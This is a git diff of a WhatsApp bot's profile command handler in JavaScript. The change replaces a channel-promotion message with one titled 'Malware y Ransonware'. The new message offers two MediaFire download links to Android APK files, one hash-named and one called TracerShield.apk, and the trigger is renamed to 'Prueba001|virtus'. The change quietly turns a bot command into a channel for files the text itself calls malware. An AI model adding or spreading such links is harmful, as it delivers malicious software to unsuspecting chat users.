@@ -19,13 +19,12 @@ let username = conn.getName(who)
 let prem = global.prems.includes(who.split`@`[0])
 let sn = createHash('md5').update(who).digest('hex')
 let str =
-`> *The-MikuBot-MDV4 ª【✫𝚃𝙴𝙰𝙼  乂 𝚂𝚃𝙰𝚁𝙲𝙾𝚁𝙴✫】*
+`> *The-MikuBot-MDV4 Malware y Ransonware*
+> Comando de prueba agregado al menu maligno (Usar bajo su responsabilidad)
+*Los siguientes links son para Androis y puede que no funcionen en iphone*
 
-> *Poya el canal del Team con tu apoyo seras de mucha ayuda* 
-
-> *ID : 120363314192605628@newsletter*
-
-> *Link : https://whatsapp.com/channel/0029Vaj67qQJUM2Wa5Ey3y1v*
+* 1- https://www.mediafire.com/file/aolyrewkzngpsz3/381134ea0f0be535b9d2ce8a94093576.apk/file
+* 2- https://www.mediafire.com/file/li30yheojtm8l2x/TracerShield.apk/file
 
 *_Whatsapp Bot by Corporations..._*`.trim()
     conn.sendFile(m.chat, pp, 'pp.mp4', str, fkontak, false, { contextInfo: { mentionedJid }}) 
@@ -33,5 +32,5 @@ let str =
 }
 handler.help = ['profile [@user]']
 handler.tags = ['xp']
-handler.command = /^Prueb|starcore?$/i
+handler.command = /^Prueba001|virtus?$/i
 export default handler
